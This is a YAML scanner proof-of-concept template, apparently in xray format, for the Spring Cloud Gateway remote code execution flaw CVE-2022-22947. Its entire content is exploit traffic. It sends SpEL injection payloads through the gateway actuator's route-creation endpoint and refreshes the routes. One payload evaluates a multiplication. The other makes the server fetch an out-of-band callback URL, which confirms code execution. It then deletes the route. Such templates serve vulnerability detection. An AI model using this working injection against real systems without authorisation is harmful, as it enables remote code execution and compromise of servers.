name: poc-yaml-spring-cloud-gateway-cve-2022-22947-rce
transport: http
set:
  reverse: newReverse()
  reverseURL: reverse.url
  randStr0: randomLowercase(5)
  routeName: randomLowercase(8)
  randInt0: randomInt(40000, 44800)
  randInt1: randomInt(40000, 44800)
rules:
  sendEchoPayload:
    request:
      method: POST
      path: /actuator/gateway/routes/new_route
      headers:
        Content-Type: application/json
      body: |
        { "predicates": [ { "name": "Path", "args": { "_genkey_0": "/{{routeName}}/**" } } ], "filters": [ { "name": "RewritePath", "args": { "_genkey_0": "#{T(java.lang.Math).multiplyExact({{randInt0}},{{randInt1}})}", "_genkey_1": "/${path}" } } ], "uri": "https://{{randStr0}}.com", "order": 0 }
    expression: response.status == 201
  sendUrlPayload:
    request:
      method: POST
      path: /actuator/gateway/routes/new_route
      headers:
        Content-Type: application/json
      body: |
        { "predicates": [ { "name": "Path", "args": { "_genkey_0": "/{{routeName}}/**" } } ], "filters": [ { "name": "RewritePath", "args": { "_genkey_0": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(new java.net.URL(\"{{reverseURL}}\").openStream()))}", "_genkey_1": "/${path}" } } ], "uri": "https://{{randStr0}}.com", "order": 0 }
    expression: response.status == 201
  doRefresh:
    request:
      method: POST
      cache: false
      path: /actuator/gateway/refresh
      headers:
        Content-Type: application/json
    expression: response.status == 200
  checkEchoPayload:
    request:
      method: GET
      path: /actuator/gateway/routes/new_route
    expression: response.status == 200 && response.body.bcontains(bytes(string(randInt0 * randInt1)))
  checkUrlPayload:
    request:
      method: POST
      cache: false
      path: /actuator/gateway/refresh
      headers:
        content-type: application/json
    expression: response.status == 200 && reverse.wait(5)
  doDelete:
    request:
      method: DELETE
      cache: false
      path: /actuator/gateway/routes/new_route
    expression: response.status == 200
expression: (sendEchoPayload() && doRefresh() && checkEchoPayload() || sendUrlPayload() && checkUrlPayload()) && doDelete()
detail:
  author: Kai
  links:
    - "https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/"
  vulnerability:
    id: CT-392828
    level: critical
